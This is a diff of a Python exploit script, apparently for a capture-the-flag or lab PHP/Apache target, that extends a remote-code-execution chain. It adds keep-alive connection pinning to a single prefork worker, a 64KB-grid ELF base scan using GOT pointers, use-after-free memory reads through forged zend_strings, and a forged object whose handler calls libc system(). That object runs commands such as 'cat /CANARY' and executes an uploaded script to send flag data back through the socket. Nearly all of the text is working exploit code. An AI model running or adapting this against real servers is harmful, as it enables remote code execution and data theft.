@@ -224,6 +224,148 @@ def _log_shot(outcome):
 
 
 # ---------------------------------------------------------------------------
+# Keep-alive worker pin (the range operator recreated bleed82 at 18:00Z with
+# StartServers 16 / MaxRequestWorkers 256, so consecutive Connection: close
+# requests round-robin across workers with DIFFERENT heap states). A single
+# persistent HTTP/1.1 connection is owned by exactly one prefork worker, so
+# R-6 (spray-slot discovery) and every R-7 shot run on ONE worker / ONE heap.
+# MaxKeepAliveRequests is 100 -> budget 85; KeepAliveTimeout 5s -> the pinned
+# path must not pause >5s between requests.
+# ---------------------------------------------------------------------------
+
+PIN = {'sock': None, 'n': 0, 'last_raw': b''}
+PIN_BUDGET = 85
+
+
+def pin_alive():
+    return PIN['sock'] is not None
+
+
+def pin_ok():
+    return pin_alive() and PIN['n'] < PIN_BUDGET
+
+
+def pin_close():
+    s = PIN['sock']
+    PIN['sock'] = None
+    PIN['n'] = 0
+    if s:
+        try:
+            s.close()
+        except Exception:
+            pass
+
+
+def pin_open():
+    pin_close()
+    for attempt in range(3):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        try:
+            s.connect((HOST, PORT))
+            PIN['sock'] = s
+            PIN['n'] = 0
+            fire_log(f"[pin] keep-alive worker pin opened (worker now pinned, attempt {attempt+1})")
+            return True
+        except Exception:
+            try:
+                s.close()
+            except Exception:
+                pass
+            time.sleep(0.5)
+    fire_log('[pin] FAILED to open pin connection')
+    return False
+
+
+def pin_send(body, content_type, timeout=15, want_raw=False):
+    """One keep-alive request on the pin. Returns body bytes or None.
+    Content-Length framed; on framing/conn errors the pin is closed and
+    PIN['last_raw'] keeps whatever arrived (exfil checks it for FLAG bytes
+    written straight into the socket by the staged script)."""
+    global req_count, crash_count
+    s = PIN['sock']
+    if s is None:
+        return None
+    req_count += 1
+    PIN['n'] += 1
+    PIN['last_raw'] = b''
+    req = (f"POST {TARGET_PATH} HTTP/1.1\r\n"
+          f"Host: {HOST}\r\n"
+          f"Content-Type: {content_type}\r\n"
+          f"Content-Length: {len(body)}\r\n"
+          f"\r\n").encode() + body
+    try:
+        s.settimeout(timeout)
+        s.sendall(req)
+    except Exception:
+        crash_count += 1
+        _log_shot('PIN-CRASH/send-fail')
+        PIN['last_raw'] = b''
+        pin_close()
+        return None
+    raw = b''
+    hdr_end = -1
+    while hdr_end < 0:
+        try:
+            chunk = s.recv(65536)
+        except Exception:
+            chunk = b''
+        if not chunk:
+            _log_shot(f'PIN-CRASH/conn-closed rawlen={len(raw)}')
+            crash_count += 1
+            PIN['last_raw'] = raw
+            pin_close()
+            return None
+        raw += chunk
+        hdr_end = raw.find(b'\r\n\r\n')
+        if len(raw) > 1 << 20:
+            break
+    if hdr_end < 0:
+        _log_shot('PIN-CRASH/no-headers')
+        crash_count += 1
+        PIN['last_raw'] = raw
+        pin_close()
+        return None
+    hdr = raw[:hdr_end].decode('latin-1', 'replace')
+    first = hdr.split('\r\n')[0]
+    clen = None
+    for line in hdr.split('\r\n'):
+        if line.lower().startswith('content-length:'):
+            try:
+                clen = int(line.split(':', 1)[1].strip())
+            except ValueError:
+                clen = None
+    if clen is None:
+        _log_shot('PIN-CRASH/no-content-length')
+        crash_count += 1
+        PIN['last_raw'] = raw
+        pin_close()
+        return None
+    total_need = hdr_end + 4 + clen
+    while len(raw) < total_need:
+        try:
+            chunk = s.recv(65536)
+        except Exception:
+            chunk = b''
+        if not chunk:
+            _log_shot(f'PIN-CRASH/short-read {len(raw)}/{total_need}')
+            crash_count += 1
+            PIN['last_raw'] = raw
+            pin_close()
+            return None
+        raw += chunk
+    body_data = raw[hdr_end + 4:total_need]
+    if ' 500 ' in first:
+        crash_count += 1
+        _log_shot(f'PIN-CRASH/500 rawlen={total_need}')
+        PIN['last_raw'] = raw[:total_need]
+        pin_close()
+        return None
+    _log_shot(f'pin-ok rawlen={total_need} bodylen={len(body_data)} n={PIN["n"]}')
+    return (body_data, raw[:total_need]) if want_raw else body_data
+
+
+# ---------------------------------------------------------------------------
 # Hash functions: GNU-hash (libc/libphp .gnu_hash), DJBX33A (PHP HashTable)
 # ---------------------------------------------------------------------------
 
@@ -300,9 +442,10 @@ def gnu_hash_lookup_window(wdata, wbase, gh_addr, symtab, strtab, names):
 # UAF primitives
 # ---------------------------------------------------------------------------
 
-def isstring_read(fake_str_addr, timeout=5):
+def isstring_read(fake_str_addr, timeout=5, pinned=False):
     """Forge a zend_string at fake_str_addr by overwriting one bucket's val
-    with that pointer and IS_STRING type. Returns (len, data) or None on crash.
+    with that pointer and IS_STRING type. Returns (len, data) or None on
+    crash. pinned=True routes the request over the keep-alive worker pin.
     """
     global crash_count, cur_tag
     saved_tag = cur_tag
@@ -322,7 +465,15 @@ def isstring_read(fake_str_addr, timeout=5):
         parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
     parts.append(f'i:{SPRAY_COUNT+1};R:{REF_BASE};'.encode('latin-1'))
     payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
-    output = send_http(payload, timeout=timeout)
+    if pinned:
+        if not pin_alive():
+            cur_tag = saved_tag
+            fire_log(f"[read @{fake_str_addr:#x}] pin dead - aborting pinned read")
+            return None
+        output = pin_send(b'cook=' + urlencode_bytes(payload),
+                          'application/x-www-form-urlencoded', timeout=timeout)
+    else:
+        output = send_http(payload, timeout=timeout)
     cur_tag = saved_tag
     if output is None:
         crash_count += 1
@@ -677,61 +828,127 @@ def _elf_resolve_symbols(base, phnum, names):
 # ===========================================================================
 
 def scan_for_elf(chunk):
-    """R-2: Find libphp's ELF base near the heap chunk.
-
-    Two-pass: 2MB step scan around `chunk` then 1MB-step refinement near the
-    candidate with the largest e_phnum. Returns a list of (base, phnum)
-    sorted by phnum descending; the caller validates each by resolving
-    executor_globals since multiple DSOs can share the top phnum.
-    """
-    print("\n[Phase R-2] Finding libphp.so")
+    """R-2 (8089 retune): find DSO bases near the heap chunk.
+    The vendor 2MB-grid sweep missed on this box (arm64 DSO bases are
+    64KB-aligned and need not share the chunk's 2MB grid: in the current
+    epoch the DSO cluster sits at chunk-2.1MB .. chunk+56MB and NOTHING
+    aligns to 2MB). Cascade (all discovery stays LIVE):
+      A. 64KB-grid sweep DOWNWARD from the chunk (the ZMM chunk is mmap'd
+         amid the DSO cluster; opcache sits just below it) and UPWARD,
+      B. GOT-route: for every hit, read the DSO's own .dynamic/GOT via the
+         DT_PLTRELSZ anchor (R-4 machinery), take an external pointer (its
+         dependencies - e.g. opcache's GOT points straight into libphp),
+         and walk backward at 64KB steps to the nearest ELF base below it,
+      C. vendor fallback: 2MB grid +-512MB, then GOT-route again.
+    Returns candidates in DISCOVERY order (nearest/most-likely first);
+    the caller validates each by resolving executor_globals (R-3)."""
+    print("\n[Phase R-2] Finding libphp.so (64KB-grid cascade)")
     candidates = []
+    tried = set()
 
-    # Pass 1: 2MB sweeps in both directions.
-    for i in range(256):
-        for d in (1, -1):
-            cand = chunk + d * i * 0x200000
-            if cand <= 0 or cand > ADDR_MAX:
-                continue
-            epn = _read_elf_header(cand)
-            if epn is None:
-                continue
-            candidates.append((cand, epn))
-            print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
-        big = [epn for _, epn in candidates if epn >= 10]
-        if len(big) >= 2 or len(candidates) >= 8:
-            break
+    def probe(cand):
+        if cand <= 0 or cand > ADDR_MAX or cand in tried:
+            return None
+        tried.add(cand)
+        epn = _read_elf_header(cand)
+        if epn is None:
+            return None
+        candidates.append((cand, epn))
+        print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
+        return epn
 
-    if not candidates:
-        return []
-
-    # Pass 2: 1MB refinement around the highest-phnum candidate.
-    known = set(b for b, _ in candidates)
-    ref_base = max(candidates, key=lambda x: x[1])[0]
-    print(f"  Fine-grained scan near 0x{ref_base:x}")
-    for d in (-1, 1):
-        consec_miss = 0
-        for step in range(1, 129):
-            cand = ref_base + d * step * 0x100000
-            if cand in known or cand <= 0:
-                continue
-            epn = _read_elf_header(cand)
-            if epn is None:
-                consec_miss += 1
-                if consec_miss >= 32:
-                    break
-                continue
-            candidates.append((cand, epn))
-            known.add(cand)
-            print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
-            consec_miss = 0
-            if epn >= 10:
+    def got_route(base, epn):
+        """GOT-route one hit: external ptr -> backward 64KB walk."""
+        ptr = _dso_external_ptr(base, epn)
+        if not ptr:
+            return None
+        print(f"  GOT-route: external ptr 0x{ptr:x} from 0x{base:x}")
+        page = ptr & ~0xFFFF  # 64KB grid
+        for pi in range(1, 321):  # 20MB backward
+            cand = page - pi * 0x10000
+            if cand <= 0:
                 break
+            if probe(cand):
+                return cand
+        return None
 
-    # Several DSOs can tie on phnum (seen on arm64 with libphp/libc/libssl all
-    # at 9), so return the full ranked list and let the caller validate by
-    # actually resolving executor_globals.
-    return sorted(candidates, key=lambda x: -x[1])
+    # Pass A: 64KB grid downward first (cluster sits just below on this box)
+    for i in range(1, 129):
+        probe(chunk - i * 0x10000)
+    for base, epn in list(candidates):
+        got_route(base, epn)
+
+    # Pass A2: 64KB grid upward
+    for i in range(1, 641):
+        probe(chunk + i * 0x10000)
+        if i % 128 == 0:
+            print(f"  ... up-ring {i} ({req_count} reqs, {len(candidates)} hits)")
+        if len(candidates) >= 10:
+            break
+    for base, epn in list(candidates):
+        got_route(base, epn)
+
+    # Pass C: vendor fallback sweeps
+    if not candidates:
+        print("  falling back to vendor 2MB-grid sweep (+-512MB)")
+        for i in range(1, 257):
+            for d in (1, -1):
+                probe(chunk + d * i * 0x200000)
+            big = [e for _, e in candidates if e >= 10]
+            if len(big) >= 2 or len(candidates) >= 8:
+                break
+        for base, epn in list(candidates):
+            got_route(base, epn)
+
+    return candidates
+
+
+def _dso_external_ptr(base, phnum):
+    """Read a DSO's .dynamic via the anchor trick, find DT_PLTRELSZ, use its
+    d_val as a fake-string len to dump the PLT GOT, and return one external
+    pointer (outside base..base+0x2000000) - e.g. opcache's GOT holds
+    resolved libphp pointers. Returns None on any failure."""
+    try:
+        syms = _elf_resolve_symbols(base, phnum, [])
+    except Exception:
+        return None
+    if not syms:
+        return None
+    php_dynamic = syms.get('__dynamic__')
+    if not php_dynamic:
+        return None
+    for anchor_off in (0x08, 0x18, 0x28, 0x38, 0x48):
+        r = isstring_read(php_dynamic - anchor_off, timeout=3)
+        if r is None:
+            continue
+        slen, sdata = r
+        if slen < 64 or slen > 0x200000 or len(sdata) < 64:
+            continue
+        data_abs = php_dynamic - anchor_off + 0x18
+        skip = max(0, anchor_off - 0x18)
+        dyn = sdata[skip:skip + min(1024, len(sdata) - skip)]
+        if len(dyn) < 16:
+            continue
+        for di in range(len(dyn) // 16):
+            d_tag = struct.unpack_from('<Q', dyn, di * 16)[0]
+            if d_tag == 0:
+                break
+            if d_tag != 2:  # DT_PLTRELSZ
+                continue
+            val_addr = data_abs + skip + di * 16 + 8
+            rr = isstring_read(val_addr - 0x10, timeout=4)
+            if rr is None:
+                break
+            plen, pdata = rr
+            for qi in range(0, max(0, len(pdata) - 7), 8):
+                ptr = struct.unpack_from('<Q', pdata, qi)[0]
+                if ptr < 0x100000000 or ptr > ADDR_MAX:
+                    continue
+                if base <= ptr < base + 0x2000000:
+                    continue
+                return ptr
+            break
+    return None
 
 
 def gnu_hash_resolve(elf_base, *names):
@@ -1076,18 +1293,19 @@ def derive_gpfoff(elf_base):
     return None, (std_h, gpfn)
 
 
-def find_spray_slot(heap_ref):
+def find_spray_slot(heap_ref, pinned=True):
     """R-6: walk ZendMM chunk metadata to identify the bin-320 SRUN page
     holding the freed allocation, probe its slots for our spray strings,
     and return the absolute address `S` (the data pointer of the spray
-    string we'll forge an object inside).
+    string we'll forge an object inside). Runs on the keep-alive pin so
+    the R-7 sprays land in the SAME worker's heap.
     """
     print(f"\n[Phase R-6] Spray slot discovery")
     chunk_base = heap_ref & ~0x1FFFFF
     print(f"  chunk_base = 0x{chunk_base:x}")
 
     # Read chunk metadata header.
-    r = isstring_read(chunk_base + 0x40)
+    r = isstring_read(chunk_base + 0x40, pinned=pinned)
     if r is None:
         return None
     _heap_size, cdata = r
@@ -1116,8 +1334,11 @@ def find_spray_slot(heap_ref):
 
     # Probe each 320-byte slot looking for our 280-byte spray string.
     for slot in range(64):
+        if pinned and not pin_ok():
+            fire_log(f"[R-6] pin budget/dead at slot {slot}; aborting round")
+            return None
         addr = run_start + slot * 320
-        r2 = isstring_read(addr)
+        r2 = isstring_read(addr, pinned=pinned)
         if r2 is None:
             continue
         slen, _ = r2
@@ -1161,17 +1382,25 @@ def build_rce_payload(ce_stdclass, system_addr, spray_addr, cmd14,
     return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
 
 
-def _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14, gpfoff):
+def _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14, gpfoff,
+              pinned=True):
     """One R-7 trigger: forge a stdClass whose handlers->get_properties_for
     is libc system() and whose first 16 bytes (the gc header) are the shell
     command. cmd14 is at most 14 bytes; a leading 0x09 is prepended so that
     GC_ADDREF's +1 turns it into 0x0A (newline, ignored by sh).
     Returns (body, raw_stream) - raw includes headers/leading bytes so we
     can capture data the command wrote directly into the client socket fd.
-    """
+    Runs over the keep-alive pin (same worker as S)."""
     payload = build_rce_payload(ce_stdclass, system_addr, spray_addr, cmd14,
                                 gpfoff=gpfoff)
-    output = send_http(payload, timeout=10, want_raw=True)
+    body_b = b'cook=' + urlencode_bytes(payload)
+    if pinned:
+        if not pin_alive():
+            return None
+        output = pin_send(body_b, 'application/x-www-form-urlencoded',
+                          timeout=10, want_raw=True)
+    else:
+        output = send_http(payload, timeout=10, want_raw=True)
     time.sleep(0.3)
     return output
 
@@ -1179,17 +1408,10 @@ def _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14, gpfoff):
 MULTI_BOUNDARY = b'GLMPHBLEEDBOUNDARY7f3a91c2'
 
 
-def send_multipart(cook_payload, script, timeout=15):
-    """POST multipart/form-data: field cook=<payload> + file part carrying
-    `script` (arbitrary bytes). PHP saves the file to /tmp/phpXXXXXX BEFORE
-    the app runs, so a follow-up `sh /tmp/php*` inside the same request can
-    execute it (the temp file is unlinked at request shutdown, after the
-    serialize() that hosts our RCE).
-    Returns (body, raw) or None on crash."""
-    global req_count, crash_count
-    req_count += 1
+def build_multipart_body(cook_payload, script):
+    """Multipart body: cook field + staged script file part."""
     b = MULTI_BOUNDARY
-    body = (b'--' + b + b'\r\n'
+    return (b'--' + b + b'\r\n'
             b'Content-Disposition: form-data; name="cook"\r\n\r\n' +
             cook_payload + b'\r\n'
             b'--' + b + b'\r\n'
@@ -1197,6 +1419,23 @@ def send_multipart(cook_payload, script, timeout=15):
             b'Content-Type: application/octet-stream\r\n\r\n' +
             script + b'\r\n'
             b'--' + b + b'--\r\n')
+
+
+def send_multipart(cook_payload, script, timeout=15, pinned=False):
+    """POST multipart/form-data: field cook=<payload> + file part carrying
+    `script` (arbitrary bytes). PHP saves the file to /tmp/phpXXXXXX BEFORE
+    the app runs, so a follow-up `bash /tmp/php*` inside the same request
+    can execute it (the temp file is unlinked at request shutdown, after
+    the serialize() that hosts our RCE).
+    Returns (body, raw) or None on crash."""
+    global req_count, crash_count
+    req_count += 1
+    body = build_multipart_body(cook_payload, script)
+    if pinned:
+        if not pin_alive():
+            return None
+        return pin_send(body, f'multipart/form-data; boundary={MULTI_BOUNDARY.decode()}',
+                        timeout=timeout, want_raw=True)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
     for attempt in range(2):
@@ -1248,14 +1487,20 @@ def send_multipart(cook_payload, script, timeout=15):
 
 
 def fire_cmd_multipart(ce_stdclass, system_addr, spray_addr, cmd14, script,
-                       label='', gpfoff=HANDLERS_GET_PROPS_FOR):
+                       label='', gpfoff=HANDLERS_GET_PROPS_FOR, pinned=True):
     """R-7 trigger delivered via multipart with a staged script file.
     Returns (body, raw) or (None, None)."""
     global cur_tag
     cur_tag = f'R-7 {label} cmd={cmd14!r}'
     payload = build_rce_payload(ce_stdclass, system_addr, spray_addr, cmd14,
                                 gpfoff=gpfoff)
-    out = send_multipart(payload, script)
+    out = send_multipart(payload, script, pinned=pinned)
+    if out is None and pin_alive() is False:
+        # framing failed (possibly because the staged script wrote raw flag
+        # bytes into the socket); salvage PIN['last_raw']
+        salvage = PIN['last_raw']
+        if salvage:
+            out = (salvage, salvage)
     cur_tag = 'idle'
     if out is None:
         fire_log(f"[R-7 {label}] cmd={cmd14!r} multipart -> NO RESPONSE")
@@ -1318,15 +1563,16 @@ def docker_logs_grep(pattern, since_s=20):
 
 
 def trigger_rce(ce_stdclass, system_addr, spray_addr, cmd14, label='',
-                gpfoff=HANDLERS_GET_PROPS_FOR):
+                gpfoff=HANDLERS_GET_PROPS_FOR, pinned=True):
     """R-7 single-shot: run one command (max 14 bytes after the GC byte).
     Returns (body, raw) or (None, None) on crash."""
     global cur_tag
     cur_tag = f'R-7 {label} cmd={cmd14!r}'
-    out = _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14, gpfoff)
+    out = _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14, gpfoff,
+                    pinned=pinned)
     cur_tag = 'idle'
     if out is None:
-        fire_log(f"[R-7 {label}] cmd={cmd14!r} -> NO RESPONSE (worker crashed)")
+        fire_log(f"[R-7 {label}] cmd={cmd14!r} -> NO RESPONSE (worker/pin crashed)")
         return (None, None)
     body, raw = out
     flag = FLAG_RE.search(raw)
@@ -1391,11 +1637,13 @@ def http_get(path, timeout=6):
 
 
 def _verify_S(spray_addr):
-    """Check the spray slot still holds our 280-byte string (the worker
-    may have respawned since S was derived)."""
+    """Check the spray slot still holds our 280-byte string (the pin worker
+    may have crashed/respawned since S was derived). Runs on the pin."""
     global cur_tag
+    if not pin_ok():
+        return None
     cur_tag = 'R-7 verify-S'
-    r = isstring_read(spray_addr - 0x18)
+    r = isstring_read(spray_addr - 0x18, pinned=True)
     cur_tag = 'idle'
     if r is not None and r[0] == SPRAY_LEN:
         fire_log(f"[R-7 verify-S] S ok: len={r[0]}, head={r[1][:16].hex()}")
@@ -1427,7 +1675,7 @@ def exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff):
     ev['S_verify_head'] = head
 
     body, raw = trigger_rce(ce_stdclass, system_addr, spray_addr, b'id',
-                            label='id', gpfoff=gpfoff)
+                            label='id', gpfoff=gpfoff, pinned=True)
     ev['id_raw'] = (raw or b'')[:2000].decode('latin-1', 'replace')
     dl = docker_logs_grep(r'uid=')
     ev['id_docker_logs'] = dl
@@ -1437,7 +1685,7 @@ def exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff):
         ev['abort'] = 'S-stale-after-id'
         return None, ev
     body, raw = trigger_rce(ce_stdclass, system_addr, spray_addr, b'cat /CANARY',
-                            label='cat-canary', gpfoff=gpfoff)
+                            label='cat-canary', gpfoff=gpfoff, pinned=True)
     ev['cat_canary_raw'] = (raw or b'')[:2000].decode('latin-1', 'replace')
     dl = docker_logs_grep(r'FLAG\{|CANARY')
     ev['cat_canary_docker_logs'] = dl
@@ -1448,8 +1696,10 @@ def exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff):
         return None, ev
     body, raw = fire_cmd_multipart(ce_stdclass, system_addr, spray_addr,
                                    b'bash /tmp/php*', EXFIL_SCRIPT,
-                                   label='upload-exfil', gpfoff=gpfoff)
+                                   label='upload-exfil', gpfoff=gpfoff,
+                                   pinned=True)
     ev['upload_exfil_raw'] = (raw or b'')[:4000].decode('latin-1', 'replace')
+    ev['upload_exfil_pin_last_raw'] = PIN['last_raw'][:4000].decode('latin-1', 'replace')
     dl = docker_logs_grep(r'FLAG\{')
     ev['upload_exfil_docker_logs'] = dl
     fire_log(f"[R-7 upload-exfil] docker-logs FLAG check: {dl[:120] if dl else '(none)'}")
@@ -1473,8 +1723,10 @@ def exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff):
         return None, ev
     body, raw = fire_cmd_multipart(ce_stdclass, system_addr, spray_addr,
                                    b'sh /tmp/php*', EXFIL_SCRIPT,
-                                   label='upload-exfil-sh', gpfoff=gpfoff)
+                                   label='upload-exfil-sh', gpfoff=gpfoff,
+                                   pinned=True)
     ev['upload_exfil_sh_raw'] = (raw or b'')[:4000].decode('latin-1', 'replace')
+    ev['upload_exfil_sh_pin_last_raw'] = PIN['last_raw'][:4000].decode('latin-1', 'replace')
     if raw is not None:
         m = FLAG_RE.search(raw)
         if m:
@@ -1621,35 +1873,40 @@ def main():
                               'zend_std_get_properties_for': hex(gp_ev[1]) if gp_ev and gp_ev[1] else None})
     print(f"  get_properties_for = handlers+{gpfoff:#x}")
 
-    # R-6 + R-7: spray-slot discovery and the RCE/exfil shots, with retry
-    # rounds (each round re-derives S; a worker respawn invalidates it).
+    # R-6 + R-7: spray-slot discovery and the RCE/exfil shots. Every round
+    # opens a FRESH keep-alive pin (one prefork worker owns a connection),
+    # re-derives S on that pinned worker, then fires the exfil shots on it.
+    # Stale S / dead pin / budget aborts just start the next round.
     flag = None
     ev = {}
-    for round_i in range(6):
-        spray_addr = state_get('spray_addr')
-        if round_i > 0:
-            if spray_addr:
-                state_save(spray_addr=None)
-                spray_addr = None
-            fire_log(f"[R-6/R-7 retry] round {round_i+1}: re-deriving spray slot")
-        if not spray_addr:
-            cur_tag = 'R-6 spray-slot'
-            spray_addr = find_spray_slot(heap_ref)
-            if spray_addr is None:
-                fire_log("[R-6] spray slot not found; refreshing heap leak (R-1)")
-                print("  spray slot not found; re-running R-1")
-                heap_ref = heap_leak()
-                if not heap_ref:
-                    fire_log("[R-6/R-1] heap leak retry failed")
-                    continue
-                state_save(heap_ref=heap_ref)
-                cur_tag = 'R-6 spray-slot'
-                spray_addr = find_spray_slot(heap_ref)
-            if spray_addr is None:
-                fire_log(f"[R-6] FAILED round {round_i+1} (spray slot not found)")
+    for round_i in range(8):
+        fire_log(f"[R-6/R-7 round {round_i+1}] opening fresh worker pin")
+        print(f"\n[Phase R-6] round {round_i+1}: pinning one worker (keep-alive)")
+        pin_close()
+        if not pin_open():
+            time.sleep(1)
+            continue
+        cur_tag = 'R-6 spray-slot'
+        spray_addr = find_spray_slot(heap_ref, pinned=True)
+        if spray_addr is None:
+            fire_log(f"[R-6 round {round_i+1}] no slot; refreshing R-1 heap leak")
+            print("  spray slot not found; re-running R-1")
+            heap_ref = heap_leak()
+            if not heap_ref:
+                fire_log("[R-1] heap leak retry failed")
                 continue
-            fire_log(f"[R-6] S = {spray_addr:#x} (reqs={req_count})")
-            state_save(spray_addr=spray_addr)
+            state_save(heap_ref=heap_ref)
+            print(f"  new heap_ref = 0x{heap_ref:x}")
+            pin_close()
+            if not pin_open():
+                continue
+            cur_tag = 'R-6 spray-slot'
+            spray_addr = find_spray_slot(heap_ref, pinned=True)
+        if spray_addr is None:
+            fire_log(f"[R-6] FAILED round {round_i+1} (spray slot not found)")
+            continue
+        fire_log(f"[R-6] S = {spray_addr:#x} (reqs={req_count})")
+        state_save(spray_addr=spray_addr)
         print(f"  S = 0x{spray_addr:x}")
 
         print(f"\n[Phase R-7] RCE trigger + canary exfil (round {round_i+1})")
@@ -1657,7 +1914,7 @@ def main():
         if flag:
             break
         abort = ev.get('abort', '')
-        fire_log(f"[R-7 round {round_i+1}] no capture{' (' + abort + ')' if abort else ''}; invalidating S")
+        fire_log(f"[R-7 round {round_i+1}] no capture{' (' + abort + ')' if abort else ''}; next round")
         state_save(spray_addr=None)
 
     if flag:
